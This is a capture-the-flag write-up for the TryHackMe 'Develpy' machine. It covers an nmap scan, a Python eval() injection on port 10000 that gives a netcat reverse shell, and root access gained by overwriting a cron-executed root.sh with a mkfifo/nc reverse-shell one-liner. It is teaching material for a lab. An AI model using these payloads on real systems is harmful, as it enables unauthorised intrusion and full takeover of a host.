# Develpy

---

Platform: Tryhackme

Difficulty: Medium

Initial Access: Misconfigured python script running on open port

Privilege escalation: Misconfigured file permission and weak security practices.

---

Nmap scan:

```bash
┌──(ghost㉿kali)-[~/tryhackme/develpy]
└─$ sudo nmap -Pn -A -p- --min-rate 4000 10.201.67.205 -oN nmap.full
[sudo] password for ghost: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 23:12 EDT
Nmap scan report for 10.201.67.205
Host is up (0.27s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
10000/tcp open  snet-sensor-mgmt?
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Port | Methodology |
| --- | --- |
| 22 (SSH) | Potentially for later use. |
| 10000 (unknown) | Looks like some kind of custom service. |

---

### Initial Access

Connected to the port 10000 via netcat, some type of python script is running which is asking for a input.

![image.png](image.png)

<aside>
💡

This type of service often contains vulnerabilities in the way it handles your input (e.g., `eval()` on Python input, insecure `int()` casting without sanitization, or even command injection if it’s running shell commands in the background).

</aside>

We can try some different payloads instead of providing what it wants from us.

![image.png](image%201.png)

Ok, that means it’s using `eval()` on your input, which is executing commands directly on the target.

We can now gain reverse shell through that.

```bash
payload = __import__('os').system('nc <ip> 4445 -e /bin/sh')
```

![image.png](image%202.png)

![image.png](image%203.png)

Grabbed user.txt from king’s home directory

```bash
king@ubuntu:~$ ls -la
ls -la
total 324
drwxr-xr-x 4 king king   4096 Aug 27  2019 .
drwxr-xr-x 3 root root   4096 Aug 25  2019 ..
-rw------- 1 root root   2929 Aug 27  2019 .bash_history
-rw-r--r-- 1 king king    220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 king king   3771 Aug 25  2019 .bashrc
drwx------ 2 king king   4096 Aug 25  2019 .cache
-rwxrwxrwx 1 king king 272113 Aug 27  2019 credentials.png
-rwxrwxrwx 1 king king    408 Aug 25  2019 exploit.py
drwxrwxr-x 2 king king   4096 Aug 25  2019 .nano
-rw-rw-r-- 1 king king      5 Aug  9 20:25 .pid
-rw-r--r-- 1 king king    655 Aug 25  2019 .profile
-rw-r--r-- 1 root root     32 Aug 25  2019 root.sh
-rw-rw-r-- 1 king king    139 Aug 25  2019 run.sh
-rw-r--r-- 1 king king      0 Aug 25  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 king king     33 Aug 27  2019 user.txt
-rw-r--r-- 1 root root    183 Aug 25  2019 .wget-hsts
king@ubuntu:~$ cat user.txt
cat user.txt
cf85ff7..............REDACTED
```

---

### Privilege Escalation

There were some suspicious .sh files like `run.sh, root.sh` in king’s home directory

![image.png](image%204.png)

- root.sh
    
    ![image.png](image%205.png)
    
    Only have read access to this file, and it’s running some king of python file inside `/root/company/media` directory.
    
- run.sh
    
    ![image.png](image%206.png)
    
    It’s the file which is serving that exploit.py file on port 10000, useless for privilege escalation.
    

Now, we can check cronjobs running in the background.

![image.png](image%207.png)

Ok, root is firstly changing directory to `/home/king` which is owned by King and then executing root.sh file.

As can king have full permission to it’s home directory, it can remove that existing root.sh file and create a new root.sh file with reverse shell in it. As root will execute that file, we will get root’s shell.

```bash
reverse-shell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 4446 >/tmp/f
```

![image.png](image%208.png)

After a few seconds, got root’s shell.

![image.png](image%209.png)

Grabbed root.txt from root directory.

```bash
# cd /root
# ls -la
total 32
drwx------  4 root root 4096 Aug 25  2019 .
drwxr-xr-x 22 root root 4096 Aug 25  2019 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  4 root root 4096 Aug 27  2019 company
-rw-r--r--  1 root root 1185 Nov 12  2018 .gitignore
drwxr-xr-x  2 root root 4096 Aug 25  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Aug 25  2019 root.txt
# cat root.txt
9c37646..............REDACTED
```

---

That’s it for this machine.✅